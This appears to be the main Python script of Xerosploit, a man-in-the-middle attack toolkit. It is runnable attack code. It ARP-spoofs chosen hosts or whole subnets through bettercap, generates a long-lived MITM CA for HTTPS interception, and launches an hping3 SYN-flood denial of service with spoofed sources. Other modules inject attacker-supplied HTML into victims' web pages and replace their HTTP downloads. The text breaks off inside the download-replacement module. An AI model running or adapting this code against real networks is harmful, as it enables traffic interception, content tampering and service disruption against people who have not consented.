#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#---------------------------------------------------------------------------#
# This file is part of Xerosploit.                                          #
# Xerosploit is free software: you can redistribute it and/or modify        #
# it under the terms of the GNU General Public License as published by      #
# the Free Software Foundation, either version 3 of the License, or         #
# (at your option) any later version.                                       #
#                                                                           #
# Xerosploit is distributed in the hope that it will be useful,             #
# but WITHOUT ANY WARRANTY; without even the implied warranty of            #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             #
# GNU General Public License for more details.                              #
#                                                                           #
# You should have received a copy of the GNU General Public License         #
# along with Xerosploit.  If not, see <http://www.gnu.org/licenses/>.       #
#                                                                           #
#---------------------------------------------------------------------------#
#                                                                           #
#        Copyright © 2019 Neodrix (www.neodrix.com)                         #
#                                                                           #
#---------------------------------------------------------------------------#

import os
import re
import shlex
import shutil
import tempfile
from terminaltables import DoubleTable
from tabulate import tabulate
from banner import xe_header
import sys, traceback
from time import sleep

# Force UTF-8 output: on minimal locales (Docker, SSH sessions, Raspberry Pi
# with LANG=POSIX) printing the box-drawing tables raised
# UnicodeEncodeError: 'ascii' codec can't encode ... (issues #34/#101/#154/#172/#271).
try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

#Check if the script is running as root .
# os.geteuid does not exist on Windows (issue #163) -> fail with a clear
# message instead of AttributeError: module 'os' has no attribute 'geteuid'.
_geteuid = getattr(os, "geteuid", None)
if _geteuid is None:
    sys.exit("""\033[1;91m\n[!] Xerosploit only runs on Linux (macOS/WSL may partly work, native Windows is unsupported).\n\033[1;m""")
if not _geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Xerosploit must be run as root. (run with sudo)\n\033[1;m""")

# Base directory: installed location (/opt/xerosploit) or repo checkout.
# Fixes FileNotFoundError: '/opt/xerosploit/tools/files/iface.txt' (issue #352)
# when running from a git clone without installing first.
def _detect_base_dir():
    candidates = [
        "/opt/xerosploit",
        os.path.dirname(os.path.abspath(__file__)),
    ]
    for path in candidates:
        if os.path.isfile(os.path.join(path, "banner.py")) and \
           os.path.isdir(os.path.join(path, "tools")):
            return path
    return candidates[0]

BASE_DIR = _detect_base_dir()

def xe_path(*parts):
    """Absolute path for a file inside the xerosploit tree."""
    return os.path.join(BASE_DIR, *parts)

def ensure_runtime_files():
    for sub in ("tools/files", "tools/log", "tools/bettercap2/tmp", "xerosniff", "xedriftnet"):
        try:
            os.makedirs(xe_path(sub), exist_ok=True)
        except Exception:
            pass
    for name in ("tools/files/iface.txt", "tools/files/gateway.txt"):
        full = xe_path(name)
        if not os.path.isfile(full):
            try:
                with open(full, "w") as f:
                    f.write("0")
            except Exception:
                pass

ensure_runtime_files()

def require_cmd(name, hint=None):
    """Warn if an external dependency is missing. Returns True if present."""
    if shutil.which(name) is None:
        print("\033[1;91m\n[!] Required command '%s' not found in PATH.%s\033[1;m"
              % (name, (" " + hint) if hint else ""))
        return False
    return True

def shell_quote(path):
    return shlex.quote(path)

def expand_path(path):
    """Expand ~, strip surrounding quotes, resolve relative paths."""
    if path is None:
        return ""
    path = path.strip().strip("'\"")
    path = os.path.expanduser(os.path.expandvars(path))
    return path

def is_valid_ipv4(addr):
    """True if addr is a valid IPv4 address (rejects garbage like 'via')."""
    try:
        import ipaddress
        return isinstance(ipaddress.ip_address(addr.strip()), ipaddress.IPv4Address)
    except Exception:
        return False

def detect_cidr(iface):
    """Detect the CIDR prefix length of iface (e.g. '24').

    Fixes hardcoded '/24' scans on networks with other masks such as
    255.255.0.0 (issues #3/#96). Falls back to '24' when undetectable.
    """
    try:
        out = os.popen("ip -o -f inet addr show " + shlex.quote(iface) + " 2>/dev/null").read()
        m = re.search(r"inet\s+\d+\.\d+\.\d+\.\d+/(\d+)", out)
        if m and 1 <= int(m.group(1)) <= 32:
            return m.group(1)
    except Exception:
        pass
    return "24"

def check_netconfig():
    """Pre-flight check before launching bettercap.

    An empty/garbage interface or gateway produces cryptic downstream errors
    (historically: `ifconfig: option '--gateway' not recognised`, issues
    #31/#40/#65/#149). Returns True when it is safe to launch bettercap.
    """
    iface = globals().get("up_interface", "")
    gw = globals().get("gateway", "")
    if not iface or not iface.strip() or iface.strip().startswith("-"):
        print("\033[1;91m\n[!] No network interface set. Run the 'iface' command "
              "(or '0' for auto-detect) before launching a module.\033[1;m")
        return False
    if not is_valid_ipv4(gw):
        print("\033[1;91m\n[!] No valid gateway set (got '%s'). Run the 'gateway' "
              "command (or '0' for auto-detect) before launching a module.\033[1;m" % gw)
        return False
    if not require_cmd("bettercap", "Run the installer first: sudo python3 install.py"):
        return False
    # Warm the gateway's ARP entry: bettercap resolves the gateway MAC once at
    # startup from the kernel table — on a quiet second with a cold cache it
    # falls back to spoofing ourselves. One ping prevents that.
    _orig_system("ping -c1 -W2 " + shlex.quote(gw) + " > /dev/null 2>&1")
    return True

def enable_ip_forward():
    """Enable IPv4 forwarding; warn clearly instead of failing silently.

    Targets losing internet access mid-MITM (#35/#167/#176) is often caused by
    forwarding being off (or by NAT-mode VMs, see README FAQ).
    """
    try:
        with _orig_open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
    except Exception:
        # Fallback for restricted environments; may still fail without root/net_admin.
        rc = _orig_system("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' 2>/dev/null")
        if rc != 0:
            print("\033[1;33m[!] Could not enable IP forwarding. Targets may lose "
                  "internet access; enable it manually:\n"
                  "    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward\033[1;m")

# --- bettercap v2 command builders (replaces the retired xettercap 1.x CLI) ---
def bc_eval_quote(cmds):
    """Quote a list of bettercap session commands as one shell-safe -eval word."""
    return shlex.quote("; ".join(cmds))

def bc_hostnames(gateway_ip):
    """Resolve mDNS/.local device names + the 'gateway' marker for IPs on the
    subnet, exactly like bettercap's net.show (the column the user pasted).

    Runs a short, always-terminating bettercap session that does net.probe,
    waits for mDNS answers, prints net.show and quits; then parses the
    IP -> Name column. Returns one line per IP (matching the order of the
    nmap `devices` column) or "" on any failure — the scan table must never
    break because naming is unavailable (issues #319/#351).
    """
    if not is_valid_ipv4(gateway_ip or ""):
        return ""
    if not require_cmd("bettercap", "Run the installer first: sudo python3 install.py"):
        return ""
    # net.show (text table) only streams during a live session; capture it with
    # a bounded run so we never hang the menu. `quit` + stdin EOF = clean stop
    # (see the arp spoof session note in sniff()).
    iface = globals().get("up_interface", "") or ""
    if not iface:
        return ""
    eval_cmds = "net.probe on; sleep 6; net.show; quit"
    cmd = ("bettercap -iface " + shlex.quote(iface)
           + " -gateway-override " + shlex.quote(gateway_ip)
           + " -eval " + bc_eval_quote([eval_cmds]))
    try:
        out = _orig_popen(cmd + " < /dev/null").read()
    except Exception:
        return ""
    # Lines like:  | 192.168.1.7 | 60:a4:b7:... | Android_8J37PMZ3.local. | ...
    # (IP, MAC, Name, Vendor ...). Fall back to vendor-only silently.
    ip2name = dict()
    for line in out.splitlines():
        # Strip ANSI keep the raw table rows; match "IP ... Name" cells.
        if "|" not in line and "│" not in line:
            continue
        # we receive the box-drawing printable (U+2502) from bettercap's
        # terminaltables DoubleTable; normalize to ASCII before splitting.
        row = line.replace("│", "|")
        cells = [c.strip() for c in row.split("|")]
        # typical net.show row has >= 4 cells; IP in [1], name in [3]
        if len(cells) >= 4 and is_valid_ipv4(cells[1]):
            nm = cells[3].strip()
            if nm and nm != "-":
                ip2name[cells[1]] = nm
    # Reorder to match nmap's devices column (grep report -> 5th field).
    order = os.popen("grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'").read().splitlines()
    names = []
    for ip in order:
        names.append(ip2name.get(ip.strip(), ""))
    if names:
        return "\n".join(names) + "\n"
    return ""


def bc_cmd(eval_cmds):
    """Full bettercap v2 command line (foreground; Ctrl+C stops, restores ARP)."""
    return ("bettercap -iface " + shlex.quote(up_interface)
            + " -gateway-override " + shlex.quote(gateway)
            + " -eval " + bc_eval_quote(eval_cmds))

def bc_spoof_eval(target_ips):
    """MITM prelude, proven recipe: discover, settle, target, spoof.

    net.probe keeps targets resolvable (v2 resolves spoof targets from live
    discovery); -gateway-override (above) pins the spoofed gateway pair.
    Empty target_ips (the 'all' choice) targets the entire subnet.
    """
    cmds = ["net.probe on", "sleep 5"]
    targets = clean_targets(target_ips)
    if targets:
        cmds.append("set arp.spoof.targets " + targets)
    cmds.append("arp.spoof on")
    return cmds

def clean_targets(target_ips):
    """Sanitize target list for `set arp.spoof.targets` (v2 takes IP/MAC csv).

    Returns "" for whole-subnet. Returns None when invalid.
    """
    if target_ips is None:
        return ""
    text = target_ips.strip().replace(" ", "")
    if text == "":
        return ""
    if not re.match(r"^[A-Za-z0-9.,:_-]+$", text):
        return None
    return text

def js_quote(path):
    """Escape a path for a JS single-quoted string in generated proxy scripts."""
    return path.replace("\\", "\\\\").replace("'", "\\'")

def stage_js(template_name, replacements):
    """Render tools/bettercap2/js/<template> into tmp/ and return its path.

    Returns None (after printing) when the template cannot be read/written.
    """
    ensure_runtime_files()
    src = xe_path("tools", "bettercap2", "js", template_name)
    try:
        with _orig_open(src, "r", encoding="utf-8") as f:
            content = f.read()
    except OSError as e:
        print("\033[1;91m\n[!] Missing proxy template '%s' (%s). Re-run the installer.\033[1;m" % (src, e))
        return None
    for key, val in replacements.items():
        content = content.replace(key, val)
    dest = xe_path("tools", "bettercap2", "tmp", template_name)
    try:
        with _orig_open(dest, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError as e:
        print("\033[1;91m\n[!] Cannot write '%s': %s\033[1;m" % (dest, e))
        return None
    return dest

def stage_file(src_path, dest_name):
    """Copy a user file into bettercap2/tmp under a shell-safe name."""
    ensure_runtime_files()
    dest = xe_path("tools", "bettercap2", "tmp", dest_name)
    try:
        with _orig_open(src_path, "rb") as fin:
            data = fin.read()
        with _orig_open(dest, "wb") as fout:
            fout.write(data)
    except OSError as e:
        print("\033[1;91m\n[!] Cannot stage '%s': %s\033[1;m" % (src_path, e))
        return None
    return dest

def iface_ip(iface):
    """First IPv4 of an interface (for hosting the replacement image)."""
    try:
        out = os.popen("ip -o -f inet addr show " + shlex.quote(iface) + " 2>/dev/null").read()
        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return ""

# How long (seconds) the MITM CA must remain valid before we renew it.
CA_MIN_VALIDITY_SECS = 180 * 24 * 3600

def ca_paths():
    """(crt, key) paths of xerosploit's own MITM CA (shipped to /opt)."""
    return (xe_path("tools", "bettercap2", "ca.crt"),
            xe_path("tools", "bettercap2", "ca.key"))

def ca_usable(crt, key):
    """True if the CA exists, parses, stays valid past the safety margin
    (covers 2026/2027 and beyond) and has a >= 2048 bit key."""
    try:
        if not (os.path.isfile(crt) and os.path.isfile(key)):
            return False
        if _orig_system("openssl x509 -in %s -noout -checkend %d > /dev/null 2>&1"
                        % (shell_quote(crt), CA_MIN_VALIDITY_SECS)) != 0:
            return False
        out = _orig_popen("openssl rsa -in %s -noout -text 2>/dev/null | head -n 1"
                          % shell_quote(key)).read()
        m = re.search(r"\((\d+)\s+bit", out)
        return bool(m and int(m.group(1)) >= 2048)
    except Exception:
        return False

def ca_fingerprint(crt):
    """SHA256 fingerprint of the CA cert (to verify on the victim)."""
    try:
        out = _orig_popen("openssl x509 -in %s -noout -fingerprint -sha256 2>/dev/null"
                          % shell_quote(crt)).read().strip()
        m = re.search(r"([0-9A-Fa-f:]{59,})", out)
        if m:
            return m.group(1).upper()
    except Exception:
        pass
    return ""

def ensure_ca():
    """Maintain xerosploit's long-lived MITM CA (10 years, not the 1-year
    default bettercap generates). Returns (crt, key) paths, or (None, None)
    when openssl is unavailable (caller falls back to bettercap's own CA).
    """
    crt, key = ca_paths()
    if ca_usable(crt, key):
        return (crt, key)
    if not shutil.which("openssl"):
        print("\033[1;33m[!] 'openssl' not found: cannot (re)generate the MITM CA. "
              "bettercap will use its own short-lived CA instead.\033[1;m")
        return (None, None)
    try:
        os.makedirs(os.path.dirname(crt), exist_ok=True)
    except Exception:
        pass
    print("\033[1;34m[++] (Re)generating 10-year MITM CA ...\033[1;m")
    rc = _orig_system(
        "openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes "
        "-keyout %s -out %s -subj '/C=US/O=XeroSploit/CN=XeroSploit MITM CA' "
        "-addext 'basicConstraints=critical,CA:TRUE' "
        "-addext 'keyUsage=critical,keyCertSign,cRLSign,digitalSignature' "
        "-addext 'subjectKeyIdentifier=hash' "
        "> /dev/null 2>&1" % (shell_quote(key), shell_quote(crt)))
    if rc != 0 or not ca_usable(crt, key):
        print("\033[1;91m\n[!] CA generation failed; HTTPS interception will use "
              "bettercap's own CA (shorter validity).\033[1;m")
        return (None, None)
    try:
        os.chmod(key, 0o600)
    except Exception:
        pass
    print("\033[1;32m[+] MITM CA ready: %s\033[1;m" % crt)
    fp = ca_fingerprint(crt)
    if fp:
        print("\033[1;32m[+] CA SHA256 fingerprint: %s\033[1;m" % fp)
    return (crt, key)

def dns_domains(pattern):
    """Translate a v1-style dspoof pattern to v2 `dns.spoof.domains` csv.

    v2 matches the domain and its subdomains; `.*` means everything
    (`dns.spoof.all true`). Returns (domains_csv_or_None, use_all).
    """
    pattern = (pattern or "").strip()
    if pattern in ("", ".*", "*"):
        return (None, True)
    cleaned = re.sub(r"^\^?\.?\*+", "", pattern)
    cleaned = cleaned.replace("\\.", ".").replace("\\", "")
    cleaned = re.sub(r"[^A-Za-z0-9.,_*-]", "", cleaned).strip(".,")
    if not cleaned:
        return (None, True)
    return (cleaned, False)

# Compatibility shim: historic code hardcodes /opt/xerosploit everywhere.
# When running from a git clone (or custom prefix), transparently redirect
# those shell commands to BASE_DIR so modules keep working (issues #348/#351/#352).
_XERO_OPT = "/opt/xerosploit"
_orig_system = os.system
_orig_popen = os.popen
def _xe_expand(cmd):
    if isinstance(cmd, str) and BASE_DIR != _XERO_OPT and _XERO_OPT in cmd:
        return cmd.replace(_XERO_OPT, BASE_DIR)
    return cmd
def _patched_system(cmd):
    return _orig_system(_xe_expand(cmd))
def _patched_popen(cmd, mode="r", buffering=-1):
    return _orig_popen(_xe_expand(cmd), mode, buffering)
os.system = _patched_system
os.popen = _patched_popen

_orig_open = open
def _patched_open(file, *args, **kwargs):
    if isinstance(file, str) and file.startswith(_XERO_OPT) and BASE_DIR != _XERO_OPT:
        alt = file.replace(_XERO_OPT, BASE_DIR, 1)
        try:
            return _orig_open(alt, *args, **kwargs)
        except FileNotFoundError:
            pass
    return _orig_open(file, *args, **kwargs)
import builtins
builtins.open = _patched_open

# Exit message
exit_msg = "\n[++] Shutting down ... Goodbye. ( ^_^)／\n"
def main():
	try:

#Configure the network interface and gateway. 
		def config0():
			ensure_runtime_files()
			try:
				with open(xe_path('tools/files/iface.txt'), 'r') as f:
					up_interface = f.read()
			except FileNotFoundError:
				print("\033[1;33m[!] Missing tools/files/iface.txt, recreating with default '0'.\033[1;m")
				up_interface = "0"
			up_interface = up_interface.replace("\n","")
			if up_interface == "0" or not up_interface.strip():
				# 'route' is deprecated/missing on modern Kali; prefer 'ip route'.
				up_interface = os.popen("ip route get 1.1.1.1 2>/dev/null | awk '{print $5; exit}'").read()
				up_interface = up_interface.replace("\n","").strip()
				if not up_interface:
					up_interface = os.popen("route 2>/dev/null | awk '/Iface/{getline; print $8}'").read()
					up_interface = up_interface.replace("\n","").strip()
				if not up_interface:
					up_interface = "eth0"
					print("\033[1;33m[!] Could not auto-detect interface, falling back to 'eth0'. "
					      "Use 'iface' command to set it manually.\033[1;m")
			globals()['up_interface'] = up_interface

			try:
				with open(xe_path('tools/files/gateway.txt'), 'r') as f:
					gateway = f.read()
			except FileNotFoundError:
				print("\033[1;33m[!] Missing tools/files/gateway.txt, recreating with default '0'.\033[1;m")
				gateway = "0"
			gateway = gateway.replace("\n","")
			if gateway == "0" or not gateway.strip():
				# Parse `default via <IP>` strictly and validate it: naive
				# `awk '{print $3}'` returned garbage like 'via' on WSL and
				# some drivers, which then displayed under the Gateway tag and
				# broke scans (issues #164/#296).
				route_out = os.popen("ip route show default 2>/dev/null").read()
				m = re.search(r"default\s+via\s+(\d+\.\d+\.\d+\.\d+)", route_out)
				gateway = m.group(1) if m else ""
				if gateway and not is_valid_ipv4(gateway):
					gateway = ""
				if not gateway:
					print("\033[1;33m[!] Could not auto-detect gateway. "
					      "Use 'gateway' command to set it manually.\033[1;m")
					gateway = ""
			elif not is_valid_ipv4(gateway.strip()):
				print("\033[1;33m[!] Stored gateway '%s' is not a valid IPv4 address. "
				      "Use 'gateway' command to fix it (or '0' for auto-detect).\033[1;m" % gateway.strip())
				gateway = ""
			globals()['gateway'] = gateway
			# Detect the interface CIDR prefix (fixes hardcoded /24 on /16 etc., issues #3/#96).
			try:
				globals()['net_cidr'] = detect_cidr(globals().get('up_interface', ''))
			except Exception:
				globals()['net_cidr'] = "24"




		def home():

			config0()
			n_name = os.popen('iwgetid -r 2>/dev/null || true').read() # Get wireless network name (may be absent on wired/VMs, issue #190)
			n_mac = os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read() # Get network mac
			n_ip = os.popen("hostname -I").read() # Local IP address
			n_host = os.popen("hostname").read() # hostname


# Show a random banner. Configured in banner.py .  
			print (xe_header())

			print ("""
[+]═══════════[ Author : @LionSec1 \033[1;36m_-\\|/-_\033[1;m Website: www.neodrix.com ]═══════════[+]

                      [ Powered by Bettercap and Nmap ]""")

			print(""" \033[1;36m
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration                          █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")

			# Print network configuration , using tabulate as table.

			table = [["IP Address","MAC Address","Gateway","Iface","Hostname"],
					 ["","","","",""],
					 [n_ip,n_mac.upper(),gateway,up_interface,n_host]]
			print (tabulate(table, stralign="center",tablefmt="fancy_grid",headers="firstrow"))
			print ("")



			# Print xerosploits short description , using terminaltables as table. 
			table_datas = [
			    ['\033[1;36m\nInformation\n', 'XeroSploit is a penetration testing toolkit whose goal is to \nperform man in the middle attacks for testing purposes. \nIt brings various modules that allow to realise efficient attacks.\nThis tool is Powered by Bettercap and Nmap.\033[1;m']
			]
			table = DoubleTable(table_datas)
			print(table.table)


		# Get a list of all currently connected devices , using Nmap.
		def scan(): 
			config0()

			if not require_cmd("nmap", "Install with: sudo apt-get install -y nmap"):
				target_ip()
				return
			if not is_valid_ipv4(gateway):
				print("\033[1;91m\n[!] No valid gateway detected (got '%s'). Use 'gateway' command to set it manually.\033[1;m" % gateway)
				target_ip()
				return

			# '-sP' was removed from modern nmap; '-sn' is the replacement (issue #351).
			# Prefix comes from the interface address, not a hardcoded /24 (issues #3/#96).
			cidr = globals().get("net_cidr", "24") or "24"
			print("\033[1;34m\n[++] Scanning %s/%s ...\033[1;m" % (gateway, cidr))
			scan = os.popen("nmap " + shlex.quote(gateway) + "/" + shlex.quote(cidr) + " -n -sn ").read()

			f = open('/opt/xerosploit/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $4 ,$5, $6}'").read() + "\033[1;32m(This device)\033[1;m"

			# Resolve real device names (mDNS/.local, the "gateway" marker) like
			# bettercap's net.show does — nmap's vendor column alone often comes
			# back blank (issues #319/#351). Falls back to vendor-only silently.
			devices_host = bc_hostnames(gateway)

			
			table_data = [
			    ['IP Address', 'Mac Address', 'Manufacturer', 'Name'],
			    [devices, devices_mac, devices_name, devices_host]
			]
			table = DoubleTable(table_data)

			# Show devices found on your network
			print("\033[1;36m[+]═══════════[ Devices found on your network ]═══════════[+]\n\033[1;m")
			print(table.table)
			if not devices.strip():
				print("\033[1;33m[!] No devices found. If you run Kali in a VM, switch the "
				      "network adapter to Bridged mode (NAT mode isolates the VM, "
				      "issues #35/#83). On WSL1, scanning does not work reliably; "
				      "use a VM or native install (issue #296).\033[1;m")
			target_ip()



		# Set the target IP address .
		def target_ip():
			# NOTE: bettercap v2 takes targets via `set arp.spoof.targets`
			# (see bc_spoof_eval); empty target_ips means the whole subnet.

			print ("\033[1;32m\n[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.\n\033[1;m")
			target_ips = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
			
			if target_ips == "back":
				home()
			elif target_ips == "home":
				home()
			elif target_ips == "":
				print ("\033[1;91m\n[!] Please specify a target.\033[1;m") # error message if no target are specified. 
				target_ip()
			target_name = target_ips

			

#modules section
			def program0():
				
				# I have separed target_ip() and program0() to avoid falling into a vicious circle when the user Choose the "all" option
				enable_ip_forward() # IP forwarding (warns instead of failing silently)
				print("\033[1;34m\n[++] " + target_name + " has been targeted. \033[1;m")
				def option():
					""" Choose a module """
					print("\033[1;32m\n[+] Which module do you want to load ? Enter 'help' for more information.\n\033[1;m")
					options = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
					# Port scanner
					if options == "pscan":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Port Scanner                         █
█                                                              █
█      Find open ports on network computers and retrieve       █
█     versions of programs running on the detected ports       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Pscan : You must specify only one target host at a time .\033[1;m")
								option()
							

							print("\033[1;32m\n[+] Enter 'run' to execute the 'pscan' command.\n\033[1;m")
							action_pscan = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
							if action_pscan == "back":
								option()
							elif action_pscan == "exit":
								sys.exit(exit_msg)	
							elif action_pscan == "home":
								home()

								pscan()
							elif action_pscan == "run": 
								if not require_cmd("nmap", "Install with: sudo apt-get install -y nmap"):
									pscan()
									return
								print("\033[1;34m\n[++] Please wait ... Scanning ports on " + target_name + " \033[1;m")
								scan_port = os.popen("nmap "+ shlex.quote(target_ips) + " -Pn" ).read()

								save_pscan = open('/opt/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
								if check_open_port == "STATE\n": 

									table_data = [
										['SERVICE', 'PORT', 'STATE'],
										[ports_services, ports, ports_state]
									]
									table = DoubleTable(table_data)
									print("\033[1;36m\n[+]═════════[ Port scan result for " + target_ips +" ]═════════[+]\n\033[1;m")
									print(table.table)
									pscan()

								else:
									# if all ports are closed , show error message . 
									print (check_open_port)
									print ("\033[1;91m[!] All 1000 scanned ports on " + target_name + " are closed\033[1;m")
									pscan()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								pscan()


						pscan()

			#DoS attack
					elif options == "dos":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          DoS Attack                          █
█                                                              █
█    Send a succession of SYN requests to a target's system    █
█    to make the system unresponsive to legitimate traffic     █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							 
							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Dos : You must specify only one target host at a time .\033[1;m")
								option()

							print("\033[1;32m\n[+] Enter 'run' to execute the 'dos' command.\n\033[1;m")
							

							action_dos = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_dos == "back":
								option()
							elif action_dos == "exit":
								sys.exit(exit_msg)	
							elif action_dos == "home":
								home()
							elif action_dos == "run":
								if not require_cmd("hping3", "Install with: sudo apt-get install -y hping3"):
									dos()
									return
								print("\033[1;34m\n[++] Performing a DoS attack to " + target_ips + " ... \n\n[++] Press 'Ctrl + C' to stop.\n\033[1;m")

								dos_cmd = os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source " + shlex.quote(target_ips)) # Dos command , using hping3
								dos()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dos()
						dos()

			# Ping
					elif options == "ping":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                             Ping                             █
█                                                              █
█               Check the accessibility of devices             █
█     and show how long it takes for packets to reach host     █
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Ping : You must specify only one target host at a time .\033[1;m")
								option()
							
							
							print("\033[1;32m\n[+] Enter 'run' to execute the 'ping' command.\n\033[1;m")

							action_ping = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_ping == "back":
								option()
							elif action_ping == "exit":
								sys.exit(exit_msg)	
							elif action_ping == "home":
								home()
							elif action_ping == "run":
								print("\033[1;34m\n[++] PING " + target_ips + " (" + target_ips + ") 56(84) bytes of data ... \n\033[1;m")
								ping_cmd = os.popen("ping -c 5 " + shlex.quote(target_ips)).read()
								fping = open('/opt/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()

								table_data = [
				    				['Transmitted', 'Received', 'Loss','Time'],
				    				[ping_transmited, ping_receive, ping_lost, ping_time]
								]
								table = DoubleTable(table_data)
								print("\033[1;36m\n[+]═════════[ " + target_ips +" ping statistics  ]═════════[+]\n\033[1;m")
								print(table.table)
								ping()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								ping()

						ping()

					elif options == "injecthtml":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Inject Html                          █
█                                                              █
█           Inject Html code in all visited webpage            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_html():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injecthtml' command.\n\033[1;m")
							action_inject = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_inject == "back":
								option()
							elif action_inject == "exit":
								sys.exit(exit_msg)	
							elif action_inject == "home":
								home()
							elif action_inject == "run":
								print("\033[1;32m\n[+] Specify the file containing html code you would like to inject.\n\033[1;m")
								print("\033[1;33m[!] Note: only works on plain HTTP (not HTTPS/HSTS sites).\n\033[1;m")
								html_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
								
								if html_file == "back":
									inject_html()
								elif html_file == "home":
									home()
								else:

									html_file = expand_path(html_file)
									if not html_file or not os.path.isfile(html_file):
										print("\033[1;91m\n[!] File not found: '%s'. Please specify an existing file.\033[1;m" % html_file)
										inject_html()
										return
									if not check_netconfig():
										inject_html()
										return
									print("\033[1;34m\n[++] Injecting Html code ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									ensure_runtime_files()
									staged = stage_file(html_file, "inject.html")
									if staged is None:
										inject_html()
										return
									js_path = stage_js("inject_html.js", {"__HTML_FILE__": js_quote(staged)})
									if js_path is None:
										inject_html()
										return
									eval_cmds = (["set http.proxy.script " + js_path, "http.proxy on"]
									             + bc_spoof_eval(target_ips))
									cmd_inject = os.system(bc_cmd(eval_cmds))

									inject_html()

							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								inject_html()
						inject_html()


					elif options == "rdownload":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Replace Download                       █
█                                                              █
█            Replace files being downloaded via HTTP           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'rdownload' command.\n\033[1;m")
							action_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_rdownload == "back":
								option()
							elif action_rdownload == "exit":
